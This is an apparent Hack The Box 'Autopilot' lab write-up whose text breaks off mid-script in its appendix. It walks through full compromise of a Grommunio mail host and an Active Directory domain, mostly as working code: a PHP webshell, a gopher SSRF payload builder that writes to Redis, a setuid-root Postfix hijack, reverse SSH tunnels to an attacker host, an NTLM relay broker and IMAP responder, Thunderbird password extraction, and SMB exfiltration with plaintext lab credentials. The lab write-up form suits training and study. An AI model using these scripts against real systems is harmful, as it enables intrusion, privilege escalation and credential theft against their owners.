# Autopilot 

**Platform:** Hack The Box  
**Systems:** Grommunio Linux host, WS02, and DC01  
**Starting credential:** `deborah.hernandez` / `8F5cgp@tC8g@`

This documents the route completed in the lab. External box IPs changed after resets, so the commands use `TARGET_IP` for the current address. No flag values appear in this file. Temporary scripts that were removed after the run are included below as either transcriptions of executed code or explicitly marked reconstructions.

## Attack path

```text
Deborah's Grommunio account
  → WebDAV write + Seafile download SSRF
  → loopback Redis route-cache overwrite
  → PHP include of Deborah's uploaded text file → grofiles
  → exposed Postfix MySQL configuration → temporary Admin API access
  → Postfix daemon_directory commit → root SUID shell on Linux
  → internal network pivot and WS02 IMAP NTLM relay to WS02 SMB
  → WS02 C$ → Thunderbird saved credential → durable local admin
  → scheduled task X → reverse custom runas.exe password storage
  → Domain Administrator login → DC01 C$ → root.txt
```

## 1. Reconnaissance and supplied access

The external HTTPS service presented Grommunio Web, Files, and mail related virtual hosts. The supplied Deborah account opened Grommunio Web and its Files interface. The active instance can be pinned to the relevant hostname with `--resolve`:

```bash
export TARGET_IP='<current HTB address>'
curl -ksSI --resolve "mail.autopilot.htb:443:${TARGET_IP}" \
  https://mail.autopilot.htb/
```

The earlier Docker environment text and the CVE hint were investigated but were not needed for the verified path. The working foothold used **one SSRF** in the Seafile Files integration.

## 2. Foothold: Seafile SSRF to Redis to PHP execution

Deborah could upload a normal text file to her Files area through WebDAV. The uploaded file was not executable through its ordinary download URL. It became executable only after Grommunio Files' Redis route cache was made to point a new PHP route at that file.

The uploaded content was:

```php
<?php
header('Content-Type: text/plain');
$command = $_GET['cmd'] ?? 'id';
@passthru($command . ' 2>&1');
?>
```

In the run, this file was `rclprobe.txt` under:

```text
/var/lib/grommunio-files/data/deborah.hernandez/files/rclprobe.txt
```

The actual upload used WebDAV `PUT` with Deborah's supplied credential:

```python
import os
import requests

target = os.environ['TARGET_IP']
payload = (b'<?php header("Content-Type: text/plain"); '
           b'$c=$_GET["cmd"]??"id"; @passthru($c." 2>&1"); ?>')
response = requests.put(
    f'https://{target}/files/remote.php/dav/files/deborah.hernandez/rclprobe.txt',
    data=payload,
    auth=('deborah.hernandez', '8F5cgp@tC8g@'),
    headers={'Host': 'mail.autopilot.htb'},
    verify=False,
    timeout=25,
)
print('upload status', response.status_code)
```

### Why the Seafile downloader reached Redis

Grommunio Web's Seafile integration asked its configured service for a file download URL, then fetched that returned URL server side. A controlled response could return a `gopher://` URL, carrying Redis protocol bytes to `127.0.0.1:6379` on the Linux host.

The mock Seafile API replies were supplied as JSON attachments in an imported EML message. Their `Content-Location` headers matched the Seafile API paths requested during account validation and download:

```text
mock/api2/ping/                                  → "pong"
mock/api2/repos/                                 → mock repository list
mock/api2/repos/<repository-id>/file/?p=/route_exec → Redis SETEX gopher URL
mock/api2/repos/<repository-id>/file/?p=/route_del  → Redis DEL gopher URL
```

The new Seafile account used Grommunio Web's own `download_attachment` endpoint as its server path. Its password field accepted CRLF bytes; they injected Deborah's Web session cookie as a `Cookie` header on the internal attachment request. This let the backend read the imported JSON replies in Deborah's session. The import request used `web/index.php?load=upload_attachment&module=createmailitemmodule&...&import=1`. The exact `store`, `entryid`, `attachCid`, and cookie values came from Deborah's session and must be collected for each run.

The following script reconstructs the **Redis payload generation** from the executed payload builder. The route object and command structure are the values used in the successful run. The default cache prefix is the one observed in this run; if the instance changes, set `FILES_CACHE_PREFIX` to the current Files cache namespace.

```python
#!/usr/bin/env python3
"""Generate the two JSON strings served by the mock Seafile file API."""
import json
import os
from pathlib import Path
from urllib.parse import quote_from_bytes

prefix = os.environ.get(
    'FILES_CACHE_PREFIX', '0080d9f8020c1c04' '5f3ae6468d0c933a'
)
key = f'{prefix}/routemail.autopilot.htb#/files/index.php#rootCollection'
payload_file = '/var/lib/grommunio-files/data/deborah.hernandez/files/rclprobe.txt'
route = [
    False,
    {'/ctf': [[
        {'_route': 'ctf', 'file': payload_file},
        None, {'GET': 0}, None, False, False, None,
    ]]},
    [], {}, None,
]
route_json = json.dumps(route, separators=(',', ':'))

def resp(*values):
    out = bytearray(f'*{len(values)}\r\n'.encode())
    for value in values:
        item = str(value).encode()
        out.extend(f'${len(item)}\r\n'.encode())
        out.extend(item + b'\r\n')
    return bytes(out)

def gopher(*commands):
    data = b''.join(resp(*command) for command in commands)
    return 'gopher://127.0.0.1:6379/_' + quote_from_bytes(data, safe='')

exec_url = gopher(('SETEX', key, 20, route_json), ('QUIT',))
del_url = gopher(('DEL', key), ('QUIT',))
Path('route_urls.json').write_text(json.dumps({'exec': exec_url, 'del': del_url}))
print('route_exec JSON body:', json.dumps(exec_url))
print('route_del JSON body:', json.dumps(del_url))
```

After importing the EML and adding the Seafile account, a Web Files `filesbrowsermodule/1/downloadtotmp` request for `#R#<seafile-account-id>/mock/route_exec` caused the server-side download. The Seafile action could report an error because a Redis reply is not a file; the useful effect was the cache write. For the 20-second route lifetime, this request executed the uploaded PHP file as `grofiles` (UID 462):

```bash
curl -ksS --resolve "mail.autopilot.htb:443:${TARGET_IP}" \
  -G --data-urlencode 'cmd=id' \
  https://mail.autopilot.htb/files/index.php/ctf
```

The same SSRF path sent the `route_del` response afterward. Its deletion response was not a reliable confirmation, so the `SETEX` lifetime was also a limit on route persistence. For later commands, the route was refreshed or Redis was reached over the pivot.

### EML and account automation

This is the payload assembly from the executed script. It uses a logged-in `requests.Session` (`session`) and a saved draft response (`draft_state`). The following bootstrap created those values. In the actual run, a preliminary Seafile account had already been created and returned an `entryid` even though validation reported 401; updating it with both the injected `Cookie` and matching `User-Agent` made its status healthy. The account creation code after the EML import below is a **reconstruction** that supplies the same ID before the verified update. The repository ID is only a mock identifier; it is not an AD object or a real Seafile repository.

```python
import json
import secrets
import time
import requests

# Resolve mail.autopilot.htb to TARGET_IP in /etc/hosts before this step.
base = 'https://mail.autopilot.htb/'
session = requests.Session()
session.verify = False
session.post(base + 'web/?logon', data={
    'username': 'deborah.hernandez',
    'password': '8F5cgp@tC8g@',
}, timeout=30).raise_for_status()

dialog = 'mockattach' + secrets.token_hex(11)
repo_id = '11111111-1111-1111-1111-111111111111'
files = [
    ('attachments[]', ('ping.json', b'"pong"', 'application/json')),
    ('attachments[]', ('repos.json', json.dumps([
        {'type': 'repo', 'name': 'mock', 'id': repo_id, 'mtime': 0}
    ]).encode(), 'application/json')),
    ('attachments[]', ('file.json',
        json.dumps('http://127.0.0.1/statusmonitor').encode(), 'application/json')),
]
upload = session.post(
    base + 'web/index.php?load=upload_attachment'
           + '&dialog_attachments=' + dialog
           + '&module=createmailitemmodule&moduleid=1',
    data={'dialog_attachments': dialog, 'ignore_extract_attachid': 'true'},
    files=files, timeout=40,
).json()
uploaded = upload['grommunio']['createmailitemmodule']['1']['update']['item']
locations = [
    'mock/api2/ping/',
    'mock/api2/repos/',
    f'mock/api2/repos/{repo_id}/file/?p=/foo',
]
attachments = [
    {'inline': True, 'tmpname': item['props']['tmpname'], 'cid': location}
    for item, location in zip(uploaded, locations)
]
save_body = {'grommunio': {'createmailitemmodule': {'1': {'save': {
    'props': {'message_class': 'IPM.Note', 'subject': 'Seafile mock ' + dialog},
    'attachments': {'dialog_attachments': dialog, 'add': attachments},
}}}}}
saved = session.post(
    base + 'web/grommunio.php?subsystem=webapp_' + str(int(time.time() * 1000)),
    json=save_body, timeout=40,
).json()
draft_state = {'save': saved}
```

```python
import json
import secrets
import time
from email.message import EmailMessage
from email.policy import SMTP
from pathlib import Path

urls = json.loads(Path('route_urls.json').read_text())
exec_url, del_url = urls['exec'], urls['del']

repo_id = '11111111-1111-1111-1111-111111111111'
base = 'https://mail.autopilot.htb/'
message = EmailMessage(policy=SMTP.clone(max_line_length=998))
message['From'] = message['To'] = 'deborah.hernandez@autopilot.htb'
message['Subject'] = 'Draft route script'
message.set_content('Draft route script.')

# exec_url and del_url are produced by the Redis builder above.
responses = [
    ('mock/api2/ping/', json.dumps('pong')),
    ('mock/api2/repos/', json.dumps([
        {'type': 'repo', 'name': 'mock', 'id': repo_id, 'mtime': 0}
    ])),
    (f'mock/api2/repos/{repo_id}/file/?p=/route_exec', json.dumps(exec_url)),
    (f'mock/api2/repos/{repo_id}/file/?p=/route_del', json.dumps(del_url)),
]
for location, body in responses:
    message.add_attachment(
        body.encode(), maintype='application', subtype='json', filename='data.json'
    )
    message.get_payload()[-1]['Content-Location'] = location

item = draft_state['save']['grommunio']['createmailitemmodule']['1']['update']['item']
store = item['store_entryid']
draft_folder = item['parent_entryid']
dialog = 'mockattach' + secrets.token_hex(12)
params = {
    'load': 'upload_attachment', 'module': 'createmailitemmodule',
    'moduleid': '1', 'dialog_attachments': dialog,
    'store': store, 'destination_folder': draft_folder,
    'import': '1', 'ignore_extract_attachid': 'true',
}
import_reply = session.post(
    base + 'web/index.php', params=params, data=params,
    files=[('attachments[]', ('probe.eml', message.as_bytes(), 'message/rfc822'))],
    timeout=40,
).json()
entry_id = import_reply['grommunio']['createmailitemmodule']['1']['import']['items']
cookie = '; '.join(k + '=' + v for k, v in session.cookies.items())
config = {
    'server_address': 'mail.autopilot.htb', 'server_port': '443',
    'server_ssl': '1',
    'server_path': 'web/index.php?load=download_attachment&store='
                   + store + '&entryid=' + entry_id + '&attachCid=mock',
    'user': '@auth:token:deborah',
    'password': 'x\r\nCookie: ' + cookie + '\r\nUser-Agent: '
                + session.headers.get('User-Agent', 'python-requests'),
    'use_grommunio_credentials': '0',
}

def webapp(payload):
    return session.post(
        base + 'web/grommunio.php?subsystem=webapp_' + str(int(time.time() * 1000)),
        json={'grommunio': payload}, timeout=45,
    )

# The original run created this account earlier from a preliminary imported
# message. Creating it here from the final imported EML is a reconstruction.
preliminary = dict(config)
preliminary['password'] = 'x\r\nCookie: ' + cookie
created = webapp({'filesaccountmodule': {'1': {'save': {'props': {
    'name': 'mock-seafile-relay',
    'backend': 'Seafile',
    'backend_config': preliminary,
}}}}}).json()
account_id = created['grommunio']['filesaccountmodule']['1']['update']['item'][0]['entryid']

webapp({'filesaccountmodule': {'1': {'save': {
    'entryid': account_id, 'props': {'backend_config': config}
}}}})

def trigger(name):
    return webapp({'filesbrowsermodule': {'1': {'downloadtotmp': {
        'ids': ['#R#' + account_id + '/mock/' + name],
        'dialog_attachments': 'test' + secrets.token_hex(14),
    }}}})

trigger('route_exec')
print(session.get(base + 'files/index.php/ctf', params={'cmd': 'id'}, timeout=15).text)
trigger('route_del')
```

## 3. From `grofiles` to Linux root

The route executed with the Files service identity. It could read Postfix's Grommunio MySQL configuration; no PHP-FPM socket pivot was needed. The decisive config files were `/etc/postfix/grommunio-virtual-mailbox-maps.cf` and `/etc/postfix/grommunio-virtual-mailbox-domains.cf`. They exposed a `grommunio` MySQL account for the local `grommunio` database.

The route can be wrapped for the commands below while it is active:

```bash
rce() {
  curl -ksS --resolve "mail.autopilot.htb:443:${TARGET_IP}" \
    -G --data-urlencode "cmd=$1" \
    https://mail.autopilot.htb/files/index.php/ctf
}
rce 'id'
rce 'cat /etc/postfix/grommunio-virtual-mailbox-maps.cf'
```

The `grommunio` MySQL account could update the Admin API's database-backed admin user. The original admin hash was saved first, then replaced with a SHA-512-crypt hash of a temporary lab password:

```bash
openssl passwd -6 '<temporary admin password>'

# Run through the active route on the Linux host, substituting the DB password
# read from the Postfix config and the new hash from openssl.
mysql -h127.0.0.1 -ugrommunio -p'<DB_PASSWORD>' grommunio \
  -e 'SELECT id, username, password FROM users WHERE id=0'
mysql -h127.0.0.1 -ugrommunio -p'<DB_PASSWORD>' grommunio \
  -e "UPDATE users SET password='<SHA512_CRYPT_HASH>' WHERE id=0"
```

The local Admin API listened on `127.0.0.1:8080`. Login returned `csrf` and `grommunioAuthJwt`. Configuration requests required the JWT in the **`grommunioAuthJwt` cookie** and the CSRF value in `X-Csrf-Token`:

The following `curl` commands ran on the target through the active route. Substitute the JSON response's `csrf` and `grommunioAuthJwt` values for `${CSRF}` and `${JWT}` in the PATCH requests; those variables are not automatically retained across separate webshell calls.

```bash
curl -ksS -H 'Host: mail.autopilot.htb' \
  --data-urlencode 'user=admin' \
  --data-urlencode 'pass=<temporary admin password>' \
  http://127.0.0.1:8080/api/v1/login

curl -ksS -X PATCH -H 'Host: mail.autopilot.htb' \
  -H 'Content-Type: application/json' \
  -H "Cookie: grommunioAuthJwt=${JWT}" \
  -H "X-Csrf-Token: ${CSRF}" \
  --data '{"data":{"commit_file":"#POSTCONF"}}' \
  http://127.0.0.1:8080/api/v1/system/dbconf/grommunio-dbconf/postfix/
```

The writable `commit_file` configuration let the API apply Postfix configuration. Postfix consulted `daemon_directory` when invoking `postfix-script`. A script in Deborah's Files directory was reachable by both the Files process and Postfix. The tested script was:

```sh
#!/bin/sh
id > /var/lib/grommunio-files/data/deborah.hernandez/files/ctf-root-proof
/usr/bin/cp /bin/bash /var/lib/grommunio-files/data/deborah.hernandez/files/.ctf-rootbash
/usr/bin/chown root:root /var/lib/grommunio-files/data/deborah.hernandez/files/.ctf-rootbash
/usr/bin/chmod 4755 /var/lib/grommunio-files/data/deborah.hernandez/files/.ctf-rootbash
/usr/sbin/postconf -e "daemon_directory = /usr/lib/postfix/bin/"
exec /usr/lib/postfix/bin/postfix-script "$@"
```

It was saved as `ctf-postfix/postfix-script` below Deborah's Files data path and marked executable. The following API patch pointed Postfix at that directory:

```bash
# Run the first and last commands through the active webshell route.
rce 'mkdir -p /var/lib/grommunio-files/data/deborah.hernandez/files/ctf-postfix'

# Save the preceding shell script locally as postfix-script, then upload it
# with Deborah's WebDAV access. This URL is the Files path made above.
curl -ksS --resolve "mail.autopilot.htb:443:${TARGET_IP}" \
  -u 'deborah.hernandez:8F5cgp@tC8g@' \
  -T postfix-script \
  https://mail.autopilot.htb/files/remote.php/dav/files/deborah.hernandez/ctf-postfix/postfix-script

rce 'chmod 755 /var/lib/grommunio-files/data/deborah.hernandez/files/ctf-postfix/postfix-script'
```

```bash
curl -ksS -X PATCH -H 'Host: mail.autopilot.htb' \
  -H 'Content-Type: application/json' \
  -H "Cookie: grommunioAuthJwt=${JWT}" \
  -H "X-Csrf-Token: ${CSRF}" \
  --data '{"data":{"daemon_directory":"/var/lib/grommunio-files/data/deborah.hernandez/files/ctf-postfix"}}' \
  http://127.0.0.1:8080/api/v1/system/dbconf/postfix/ctf/
```

An earlier staging attempt under `/tmp` failed because PHP-FPM's `PrivateTmp=yes` gave it a different `/tmp` from Postfix. The Files data path avoided that mismatch. The final API response still said the commit failed, but the side effect ran: `.ctf-rootbash` became root-owned and setuid. This was verified by executing:

```bash
rce '/var/lib/grommunio-files/data/deborah.hernandez/files/.ctf-rootbash -p -c id'
```

The result had effective UID 0. The script restored Postfix's normal `daemon_directory`; the temporary admin hash and modified API configuration were also restored after access was confirmed.

```bash
# Use the same JWT and CSRF headers as above and run this on the target.
curl -ksS -X PATCH -H 'Host: mail.autopilot.htb' \
  -H 'Content-Type: application/json' \
  -H "Cookie: grommunioAuthJwt=${JWT}" \
  -H "X-Csrf-Token: ${CSRF}" \
  --data '{"data":{"daemon_directory":"/usr/lib/postfix/bin/"}}' \
  http://127.0.0.1:8080/api/v1/system/dbconf/postfix/ctf/

mysql -h127.0.0.1 -ugrommunio -p'<DB_PASSWORD>' grommunio \
  -e "UPDATE users SET password='<ORIGINAL_ADMIN_HASH>' WHERE id=0"
```

## 4. Internal network and WS02

The root-capable shell exposed the Linux host's internal network. These checks identified mail at `172.16.20.10`, DC01 at `172.16.20.1`, and WS02 at `172.16.20.15`:

```bash
rce '/var/lib/grommunio-files/data/deborah.hernandez/files/.ctf-rootbash -p -c "ip -br addr; ip route"'
```

WS02 SMB on TCP 445 was reachable from the mail host, although it was not directly reachable from the external Kali machine. The tunnel used in the run exposed WS02 SMB as Kali `127.0.0.1:25445`, DC01 SMB as `127.0.0.1:21445`, and a SOCKS proxy as `127.0.0.1:21080`. Port checks must complete a protocol handshake; an early `/dev/tcp` check blocked waiting for a banner and wrongly made WS02's open SMB port look closed.

The actual reverse-forward command was run from the root-capable shell on mail to a temporary Kali SSH service on port 6391. `-R 127.0.0.1:21080` established reverse SOCKS; the other `-R` options published internal services on Kali loopback:

```bash
setpriv --reuid=0 --regid=0 --clear-groups ssh -f -N \
  -i /var/lib/grommunio-files/data/deborah.hernandez/files/ctf-tunnel-key \
  -p 6391 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
  -o BatchMode=yes -o ExitOnForwardFailure=yes -o ServerAliveInterval=30 \
  -R 127.0.0.1:21080 \
  -R 127.0.0.1:21445:172.16.20.1:445 \
  -R 127.0.0.1:21636:172.16.20.1:636 \
  -R 127.0.0.1:21389:172.16.20.1:389 \
  -R 127.0.0.1:21135:172.16.20.1:135 \
  -R 127.0.0.1:25445:172.16.20.15:445 \
  -R 127.0.0.1:25985:172.16.20.15:5985 \
  kali@10.10.14.35
```

Known Deborah, Joshua, and `svc_ldap` credentials authenticated to WS02 SMB but could not open `C$`. WS02 did not require SMB signing. That made an NTLM relay to its own SMB service possible if a client could be induced to authenticate to an attacker-controlled listener.

Packet capture on the mail host showed WS02 connecting to its IMAP service on TCP 143. It issued `STARTTLS`, then tried `AUTHENTICATE NTLM`. The normal Gromox server advertised `AUTH=LOGIN` and rejected the attempt before a password was sent. The useful event was WS02's willingness to send NTLM when a server advertised it.

## 5. One-time IMAP NTLM relay into WS02 SMB

The relay was narrowly scoped to the CTF workstation. A temporary root IMAP responder on mail listened on port 1143. An `iptables` rule redirected only traffic from `172.16.20.15` to `172.16.20.10:143` into that port. A short-lived rollback timer removed the rule automatically. The responder reused the mail server's certificate and offered `AUTH=NTLM` after STARTTLS.

The responder sent NTLM Type 1 to a broker on Kali; the broker requested a Type 2 challenge from WS02 SMB and returned it. The responder passed WS02's Type 3 back to the broker, which authenticated to SMB and tried `C$`. The observed identity was `AUTOPILOT\stephanie.lewis`, with SMB status `0x00000000` and `admin_share=true`. The broker held that authenticated SMB session long enough to read files. This was relay authentication, not a recovered plaintext password.

The mail-side preparation used a short-lived SSH local forward to Kali's broker and transient systemd units because the PHP-FPM process could not open the packet socket needed for capture or bypass its network restrictions:

```bash
ssh -f -N -i /var/lib/grommunio-files/data/deborah.hernandez/files/ctf-tunnel-key \
  -p 6391 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
  -o BatchMode=yes -o ExitOnForwardFailure=yes -o ServerAliveInterval=30 \
  -L 127.0.0.1:18081:127.0.0.1:18081 kali@10.10.14.35

systemd-run --unit=ctf-imap-ntlm --collect --no-block \
  /usr/bin/timeout 180 /usr/bin/python3 /var/log/ctf-imap-ntlm.py

systemd-run --unit=ctf-imap-nat-rollback --on-active=150s --collect \
  /usr/sbin/iptables -t nat -D PREROUTING \
  -s 172.16.20.15 -d 172.16.20.10 -p tcp --dport 143 \
  -j REDIRECT --to-ports 1143

systemd-run --pipe --wait --collect /usr/sbin/iptables -t nat -I PREROUTING 1 \
  -s 172.16.20.15 -d 172.16.20.10 -p tcp --dport 143 \
  -j REDIRECT --to-ports 1143
```

The verified responder and a reconstructed equivalent of the transient Kali broker appear in the script appendix. The source restriction in both the responder and NAT rule matters: it kept other mail clients on the real IMAP service. The responder's log showed STARTTLS, `CAPABILITY`, `AUTHENTICATE NTLM`, Type 1, Type 3, and successful broker authentication.

## 6. Thunderbird profile and durable WS02 administrator access

The retained relay session listed WS02 `C$`. The relevant Thunderbird profile was in the **DA user's** roaming profile, despite the saved login belonging to Stephanie's ordinary account:

```text
C:\Users\da-stephanie.lewis\AppData\Roaming\Thunderbird\Profiles\p3xppadz.default-release
```

The broker copied `logins.json`, `key4.db`, `logins-backup.json`, `prefs.js`, and `cert9.db` to Kali. These files were temporary and were removed after the solve. The extraction script is in the appendix. `firepwd` decoded three saved logins with the same credential:

```bash
git clone --depth 1 https://github.com/lclevy/firepwd.git /tmp/ctf-firepwd
python3 -m venv /tmp/ctf-firepwd-venv
/tmp/ctf-firepwd-venv/bin/pip install -q -r /tmp/ctf-firepwd/requirements.txt
/tmp/ctf-firepwd-venv/bin/python /tmp/ctf-firepwd/firepwd.py \
  -d /tmp/ctf-thunderbird-profile
```

The recovered login was `stephanie.lewis@autopilot.htb` / `NKUOji@4bAJw`. It authenticated as `AUTOPILOT\stephanie.lewis` to WS02 and opened `C$`, confirming local administrator access. Successful SMB login alone would not have proved this. The password did not authenticate as WS02's built-in Administrator or as the DA account on DC01.

```bash
nxc smb 127.0.0.1 --port 25445 -d AUTOPILOT \
  -u stephanie.lewis -p 'NKUOji@4bAJw' --shares
```

Through the SOCKS pivot, `nxc smb 172.16.20.15 ... --loggedon-users` also showed an active `AUTOPILOT\da-stephanie.lewis` session. A registry check showed `RunAsPPL REG_DWORD 0x2`; an attempted `comsvcs` LSASS dump produced no dump file. `nxc --lsa` returned a DCC2 cached verifier for the DA account, which is not an NT hash usable for pass-the-hash. The next lead came from WS02's scheduled tasks instead.

## 7. Scheduled task `X` and the Domain Administrator credential

WS02's `C$\Windows\System32\Tasks\X` XML had a Stephanie logon trigger. Its action launched:

```text
C:\Users\stephanie.lewis\Videos\runas.exe
```

The executable was a custom Go PE. `objdump -t` exposed `main.passwordCipher`, `main.passwordKey`, `main.decodePassword`, and `main.runAs`. Disassembly confirmed a bytewise XOR of two 14-byte strings before `main.runAs`. Constants passed with the result identified the account as `AUTOPILOT\da-stephanie.lewis`.

The following is the **executed extraction and decode script**. The offsets are specific to the downloaded binary; inspect the symbols again if the file changes.

```python
#!/usr/bin/env python3
import struct
import pefile

pe = pefile.PE('/tmp/ctf-ws02-runas.exe')
base = pe.OPTIONAL_HEADER.ImageBase
values = []
for offset in (0x5910, 0x5930):
    header = pe.get_data(0x1ac000 + offset, 16)
    pointer, length = struct.unpack('<QQ', header)
    values.append(pe.get_data(pointer - base, length))

password = bytes(a ^ b for a, b in zip(*values)).decode()
print(password)
print(pe.get_data(0x1400e2744 - base, 9))
print(pe.get_data(0x1400e4ff2 - base, 18))
```

The decoded DA credential was `AUTOPILOT\da-stephanie.lewis` / `krFqXfDI1y4331`. It authenticated to DC01 SMB and opened administrative shares. The password could also be converted to an NT hash with Impacket, but the cleartext password was already sufficient.

## 8. DC01 and the root proof

The DC SMB tunnel presented DC01 at Kali `127.0.0.1:21445`. This was the actual check of the recovered credential:

```bash
nxc smb 127.0.0.1 --port 21445 -d AUTOPILOT \
  -u da-stephanie.lewis -p 'krFqXfDI1y4331' --shares
```

The result identified DC01, marked the credential administrative, and listed read/write access to `C$`. The following Impacket script then read the Administrator desktop's `root.txt`. It writes the file locally; no flag value is printed in this document.

```python
#!/usr/bin/env python3
from pathlib import Path
from impacket.smbconnection import SMBConnection

smb = SMBConnection('127.0.0.1', '127.0.0.1', sess_port=21445, timeout=20)
try:
    smb.login('da-stephanie.lewis', 'krFqXfDI1y4331', 'AUTOPILOT')
    data = bytearray()
    smb.getFile('C$', r'Users\Administrator\Desktop\root.txt', data.extend)
    Path('root.txt').write_bytes(data)
    print('Downloaded root.txt from DC01')
finally:
    smb.logoff()
```

After verification, the temporary IMAP redirect and responder, SSH bridge, broker session, copied Thunderbird/DPAPI files, and downloaded PE were removed. The Postfix setting and temporary Admin API password were restored.

## Investigated leads that were not needed for this route

- Joshua's S/MIME/PFX material exposed a separate service-account credential, but neither it nor the supplied Deborah credential opened WS02's administrative shares.
- The supplied Docker environment snippet was not verified as this instance's configuration. The `CVE-2026-110447` hint did not match an installed app on the tested host.
- A DC machine-account relay reached LDAPS but failed channel binding; a certificate-service RPC relay did not meet the service's packet-privacy requirement.
- A cached DA DCC2 verifier and an LSASS dump attempt did not produce a usable DA NT hash. The scheduled task and `runas.exe` were the successful DA path.

## Script appendix A: Kali SMB relay broker

The broker below is a **reconstructed equivalent** of the transient script used in the run. Its Type 1 → Type 2 → Type 3 flow, `C$` access check, and file endpoints were verified; the original temporary file was removed during cleanup. It binds only to Kali loopback. Run it with Python 3 and Impacket while the WS02 SMB reverse forward is listening on port 25445.

```python
#!/usr/bin/env python3
import base64
import json
import logging
import secrets
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from types import SimpleNamespace

from impacket import ntlm
from impacket.examples.ntlmrelayx.clients.smbrelayclient import SMBRelayClient

SESSIONS = {}
LOCK = threading.Lock()
CONFIG = SimpleNamespace(smb2support=True, remove_target=False, remove_mic=False)
TARGET = SimpleNamespace(hostname='127.0.0.1', port=25445)

def raw_ntlm(blob):
    index = blob.find(b'NTLMSSP\x00')
    if index < 0:
        raise ValueError('NTLMSSP signature missing')
    return blob[index:]

class Handler(BaseHTTPRequestHandler):
    protocol_version = 'HTTP/1.1'

    def reply(self, status, value):
        body = json.dumps(value).encode()
        self.send_response(status)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Content-Length', str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        if self.path == '/health':
            return self.reply(200, {'ok': True})
        return self.reply(404, {'error': 'not found'})

    def do_POST(self):
        try:
            size = int(self.headers.get('Content-Length', '0'))
            if size < 1 or size > 100000:
                raise ValueError('bad request size')
            request = json.loads(self.rfile.read(size))

            if self.path == '/type1':
                message = raw_ntlm(base64.b64decode(request['blob'], validate=True))
                if message[8:12] != b'\x01\x00\x00\x00':
                    raise ValueError('expected NTLM Type 1')
                client = SMBRelayClient(CONFIG, TARGET)
                if not client.initConnection():
                    raise RuntimeError('WS02 SMB connection failed')
                challenge = client.sendNegotiate(message)
                sid = secrets.token_hex(12)
                with LOCK:
                    SESSIONS[sid] = client
                return self.reply(200, {
                    'sid': sid,
                    'blob': base64.b64encode(challenge.getData()).decode(),
                    'challenge': challenge['challenge'].hex(),
                })

            if self.path == '/type3':
                message = raw_ntlm(base64.b64decode(request['blob'], validate=True))
                if message[8:12] != b'\x03\x00\x00\x00':
                    raise ValueError('expected NTLM Type 3')
                sid = request['sid']
                with LOCK:
                    client = SESSIONS.pop(sid, None)
                if client is None:
                    raise ValueError('unknown relay session')
                parsed = ntlm.NTLMAuthChallengeResponse()
                parsed.fromString(message)
                user = parsed['user_name'].decode('utf-16le', 'replace')
                domain = parsed['domain_name'].decode('utf-16le', 'replace')
                _, status = client.sendAuth(message)
                admin_share = False
                error = None
                if status == 0:
                    try:
                        tree = client.session.connectTree('C$')
                        client.session.disconnectTree(tree)
                        admin_share = True
                    except Exception as exc:
                        error = str(exc)
                if admin_share:
                    with LOCK:
                        SESSIONS[sid] = client
                else:
                    client.killConnection()
                return self.reply(200, {
                    'user': user, 'domain': domain,
                    'status': '0x%08x' % status,
                    'admin_share': admin_share,
                    'admin_share_error': error,
                    'sid': sid if admin_share else None,
                })

            if self.path in ('/listpath', '/getfile', '/close'):
                sid = request['sid']
                with LOCK:
                    client = SESSIONS.get(sid)
                if client is None:
                    raise ValueError('unknown relay session')
                if self.path == '/close':
                    with LOCK:
                        SESSIONS.pop(sid, None)
                    client.killConnection()
                    return self.reply(200, {'closed': True})
                share = request.get('share', 'C$')
                path = request['path']
                if self.path == '/listpath':
                    items = client.session.listPath(share, path)
                    return self.reply(200, {'items': [
                        {'name': item.get_longname(),
                         'directory': item.is_directory(),
                         'size': item.get_filesize()}
                        for item in items
                    ]})
                data = bytearray()
                client.session.getFile(share, path, data.extend)
                if len(data) > 4_000_000:
                    raise ValueError('file exceeds broker response limit')
                return self.reply(200, {
                    'size': len(data),
                    'blob': base64.b64encode(data).decode(),
                })

            return self.reply(404, {'error': 'not found'})
        except Exception as exc:
            logging.exception('broker request failed')
            return self.reply(400, {'error': type(exc).__name__ + ': ' + str(exc)})

ThreadingHTTPServer(('127.0.0.1', 18081), Handler).serve_forever()
```

## Script appendix B: mail-side IMAP STARTTLS responder

This is a transcription of the executed responder, whose temporary file was removed after the run. The certificate paths are those of this Grommunio instance. It accepts only the WS02 source address and exits after a relay attempt or 180 seconds.

```python
#!/usr/bin/env python3
import base64
import json
import os
import socket
import ssl
import struct
import time
import urllib.request

PORT = 1143
CLIENT = '172.16.20.15'
LOG = '/var/log/ctf-imap-ntlm.log'
HASH = '/var/log/ctf-imap-ntlm.hash'
CERT = '/etc/grommunio-common/ssl/server-bundle.pem'
KEY = '/etc/grommunio-common/ssl/server.key'
BROKER = 'http://127.0.0.1:18081'
MAGIC = b'NTLMSSP\x00'

def log(message):
    with open(LOG, 'a') as handle:
        handle.write('%s %s\n' % (time.time(), message))

def broker(path, value):
    request = urllib.request.Request(
        BROKER + path,
        data=json.dumps(value).encode(),
        headers={'Content-Type': 'application/json'},
    )
    with urllib.request.urlopen(request, timeout=12) as response:
        return json.load(response)

def field(data, offset):
    size, _, position = struct.unpack_from('<HHI', data, offset)
    if position + size > len(data):
        raise ValueError('NTLM field out of range')
    return data[position:position + size]

def hash_line(data, challenge):
    flags = struct.unpack_from('<I', data, 60)[0]
    encoding = 'utf-16le' if flags & 1 else 'ascii'
    domain = field(data, 28).decode(encoding, 'replace')
    user = field(data, 36).decode(encoding, 'replace')
    response = field(data, 20)
    if len(response) < 32:
        raise ValueError('NT response too short')
    return '%s::%s:%s:%s:%s' % (
        user, domain, challenge.hex(),
        response[:16].hex(), response[16:].hex(),
    )

def line(sock):
    data = b''
    while len(data) < 65536:
        part = sock.recv(1)
        if not part:
            raise EOFError('client closed')
        data += part
        if data.endswith(b'\n'):
            return data.rstrip(b'\r\n')
    raise ValueError('line too long')

def session(raw, tls_context):
    raw.settimeout(25)
    raw.sendall(b'* OK [CAPABILITY IMAP4rev1 STARTTLS AUTH=NTLM] Ready\r\n')
    first = line(raw)
    log('prelude %r' % first[:100])
    words = first.split()
    if len(words) < 2 or words[1].upper() != b'STARTTLS':
        raise ValueError('expected STARTTLS')
    raw.sendall(words[0] + b' OK Begin TLS negotiation\r\n')
    sock = tls_context.wrap_socket(raw, server_side=True)
    sock.settimeout(25)
    try:
        while True:
            command = line(sock)
